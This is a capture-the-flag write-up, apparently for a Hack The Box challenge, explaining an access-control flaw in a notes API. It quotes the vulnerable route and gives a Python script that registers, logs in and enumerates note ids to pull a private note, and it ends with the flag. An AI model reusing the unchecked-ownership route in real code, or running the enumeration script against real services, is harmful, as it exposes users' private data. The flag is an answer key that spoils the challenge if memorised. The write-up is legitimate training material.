# The Gate of Broken Names

```
Among the ruins of Briarfold, Mira uncovers a gate of tangled brambles and forgotten sigils. Every name carved into its stone has been reversed, letters twisted, meanings erased. When she steps through, the ground blurs—the village ahead is hers, yet wrong: signs rewritten, faces familiar but altered, her own past twisted. Tracing the pattern through spectral threads of lies and illusion, she forces the true gate open—not by key, but by unraveling the false paths the Hollow King left behind.
```

The flag is stored in the notes table:

```js
if (i === flagPosition) {
  notes.push({
    id: 10 + i,
    user_id: 1,
    title: 'Critical System Configuration',
    content: flag,
    is_private: 1,
    created_at: new Date(Date.now() - Math.floor(Math.random() * 30 + 1) * 24 * 60 * 60 * 1000).toISOString(),
    updated_at: new Date(Date.now() - Math.floor(Math.random() * 30 + 1) * 24 * 60 * 60 * 1000).toISOString()
  });
}
```

Which can be accessed by id without validating the user:

```js
router.get('/:id', async (req, res) => {
  if (!req.session.user_id) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  const noteId = parseInt(req.params.id);

  try {
    const note = db.notes.findById(noteId);

    if (note) {
      const user = getUserById(note.user_id);
      res.json({
        ...note,
        username: user ? user.username : 'Unknown'
      });
    } else {
      res.status(404).json({ error: 'Note not found' });
    }
  } catch (error) {
    console.error('Error fetching note:', error);
    res.status(500).json({ error: 'Failed to fetch note' });
  }
});
```

So we just login and enumerate the notes to find flag:

```python
import requests

# host = "http://127.0.0.1:1337"
host = "http://142.93.111.23:31781"

session = requests.Session()

# register
r = session.post(
    host + "/api/auth/register",
    data={
        "username": "test",
        "password": "test123",
        "email": "test@example.com",
        "confirm_password": "test123",
    },
)

# login
r = session.post(
    host + "/api/auth/login",
    data={
        "username": "test",
        "password": "test123",
    },
)

# find note with flag
for i in range(200):
    r = session.get(host + "/api/notes/" + str(i))
    if "HTB" in r.text:
        print(r.text)
```

Flag: `HTB{br0k3n_n4m3s_r3v3rs3d_4nd_r3st0r3d_b68801d59e76d7ae9c6f330552783c1e}`.
